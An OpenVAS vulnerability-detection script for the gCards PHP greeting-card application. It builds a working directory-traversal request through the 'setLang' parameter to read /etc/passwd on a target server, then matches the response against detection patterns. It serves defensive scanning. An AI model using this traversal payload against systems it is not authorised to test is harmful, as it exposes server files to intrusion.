# OpenVAS Vulnerability Test
# $Id: gcards_dir_transversal.nasl 9349 2018-04-06 07:02:25Z cfischer $
# Description: gCards Multiple Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is prone to
multiple vulnerabilities. 

Description :

The remote host is running gCards, a free electronic greeting card
system written in PHP. 

The installed version of gCards fails to sanitize user input to the
'setLang' parameter in the 'inc/setLang.php' script which is called by
'index.php'.  An unauthenticated attacker may be able to exploit this
issue to read arbitrary local files or execute code from local files
subject to the permissions of the web server user id. 

There are also reportedly other flaws in the installed application,
including a directory traversal issue that allows reading of local
files as well as a SQL injection and a cross-site scripting issue.";

tag_solution = "Upgrade to gCards version 1.46 or later.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80065");
  script_version("$Revision: 9349 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
  script_bugtraq_id(17165);
  script_xref(name:"OSVDB", value:"24016");
  script_xref(name:"OSVDB", value:"24017");
  script_xref(name:"OSVDB", value:"24018");
  script_name("gCards Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://retrogod.altervista.org/gcards_145_xpl.html");
  script_xref(name : "URL" , value : "http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/gcards", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  # Try to exploit the flaw in setLang.php to read /etc/passwd.
  lang = SCRIPT_NAME;
  url = string( dir, "/index.php?setLang=", lang, "&lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd");
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;

  # There's a problem if...
  if (
    egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
    (
      # there's an entry for root or ...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(inc/lang/.+/etc/passwd\).+ failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction
      egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/etc/passwd", string:res)
    )
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');

    if (content)
      report = string(
        "Here are the contents of the file '/etc/passwd' that\n",
        "OpenVAS was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = "";

    security_message(port:port, data:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}

exit( 0 );